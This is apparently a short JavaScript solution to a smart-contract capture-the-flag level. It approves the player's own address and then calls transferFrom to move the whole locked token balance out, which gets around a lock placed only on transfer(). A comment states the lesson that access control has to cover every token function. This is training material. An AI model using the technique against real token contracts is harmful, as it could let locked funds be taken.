//if using access control on token functions need to use on all
let bal = await contract.balanceOf(player)
await contract.approve(player, bal)
await contract.transferFrom(player, instance, bal)